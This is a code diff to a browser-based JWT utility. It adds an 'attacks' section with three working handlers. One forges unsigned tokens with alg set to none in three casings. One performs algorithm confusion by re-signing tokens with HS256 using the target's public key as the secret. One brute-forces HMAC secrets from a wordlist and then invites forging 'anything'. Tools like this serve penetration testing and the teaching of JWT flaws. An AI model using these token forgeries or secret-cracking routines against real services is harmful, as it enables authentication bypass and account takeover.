@@ -91,3 +91,39 @@ $('#sign').addEventListener('click', async () => {
     msg($('#smsg'), 'signed — paste it in the token box above to check it', 'ok');
   } catch (e) { msg($('#smsg'), e.message); $('#sout').value = ''; }
 });
+
+// ---------- attacks ----------
+const b64u = (s) => jose.base64url.encode(typeof s === 'string' ? enc.encode(s) : s);
+const amsg = (t, k) => msg($('#amsg'), t, k);
+$('#aNone').addEventListener('click', () => {
+  try {
+    const t = tok.value.trim().replace(/^Bearer\s+/i, ''); const [h, p] = t.split('.');
+    const head = JSON.parse(new TextDecoder().decode(jose.base64url.decode(h)));
+    const variants = ['none', 'None', 'NONE'].map((a) => `${b64u(JSON.stringify({ ...head, alg: a }))}.${p}.`);
+    $('#aout').value = variants.join('\n');
+    amsg('unsigned tokens — signature stripped, alg set to none (3 casings)', 'ok');
+  } catch (e) { amsg('need a valid token in the box above first', 'err'); }
+});
+$('#aConfuse').addEventListener('click', async () => {
+  try {
+    const pub = $('#key').value.trim();
+    if (!pub.includes('BEGIN')) return amsg('paste the target RSA/EC public key (PEM) in the verify box above', 'warn');
+    const payload = jose.decodeJwt(tok.value.trim());
+    const mk = async (secret) => new jose.SignJWT(payload).setProtectedHeader({ alg: 'HS256', typ: 'JWT' }).sign(enc.encode(secret));
+    const a = await mk(pub), b = await mk(pub + '\n');
+    $('#aout').value = `# HMAC key = public key, as-is\n${a}\n\n# HMAC key = public key + trailing newline\n${b}`;
+    amsg('signed with HS256 using the public key as the secret — try both', 'ok');
+  } catch (e) { amsg(e.message, 'err'); }
+});
+$('#aBrute').addEventListener('click', async () => {
+  const t = tok.value.trim().replace(/^Bearer\s+/i, '');
+  let h; try { h = jose.decodeProtectedHeader(t); } catch { return amsg('invalid token', 'err'); }
+  if (!h.alg || !h.alg.startsWith('HS')) return amsg(`this token is ${h.alg || 'unsigned'}, not HMAC — brute-force only works on HS256/384/512`, 'warn');
+  const words = $('#wl').value.split('\n').map((w) => w.replace(/\r$/, '')).filter((w) => w.length);
+  amsg(`trying ${words.length} secrets…`);
+  for (const w of words) {
+    try { await jose.compactVerify(t, enc.encode(w)); $('#aout').value = w; return amsg(`✓ secret found: "${w}" — now forge anything with it in the sign box`, 'ok'); }
+    catch {}
+  }
+  $('#aout').value = ''; amsg('no secret in the list matched — try a bigger wordlist (e.g. jwt.secrets / rockyou)', 'warn');
+});
